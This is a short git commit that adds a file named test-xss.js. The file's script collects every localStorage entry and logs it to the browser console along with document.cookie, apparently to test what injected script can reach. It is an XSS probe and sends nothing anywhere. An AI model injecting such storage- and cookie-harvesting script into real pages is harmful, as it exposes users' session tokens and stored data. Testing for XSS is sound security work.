b4cf1efdb659b831ea96a56e442c5948c3217e56
Enrico Erwin <enricoe@sbs.com.au>
2017-11-06 09:49:19 +1100

    add test xss js

---
+++ test-xss.js
@@ -0,0 +1,16 @@
+function allStorage() {
+
+    var archive = [],
+        keys = Object.keys(localStorage),
+        i = 0, key;
+
+    for (; key = keys[i]; i++) {
+        archive.push( key + '=' + localStorage.getItem(key));
+    }
+
+    return archive;
+}
+
+var data = allStorage();
+console.log(data);
+console.log(document.cookie);
